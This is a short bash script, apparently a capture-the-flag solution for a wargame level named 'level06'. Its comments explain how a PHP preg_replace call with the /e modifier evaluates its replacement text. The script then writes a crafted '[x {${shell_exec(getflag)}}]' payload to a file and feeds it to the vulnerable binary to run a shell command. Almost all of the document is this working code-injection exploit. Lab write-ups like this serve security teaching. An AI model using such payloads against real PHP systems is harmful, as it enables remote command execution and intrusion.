#!/bin/bash
# In the file level06.php, we can see this line :
# $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
# The e flag means that the group used in the replacement expression "y(\"\\2\")"
# will be used as a parameter to execute the y() function.
# This means we can create a sub-expression that will be invoked beforehand, like this :
# y("{${shell_exec(getflag)}}").

# Write vulnerable php string expansion into a file
echo "[x {\${shell_exec(getflag)}}]" > /var/crash/exploit
# Pass it to the binary
./level06 /var/crash/exploit
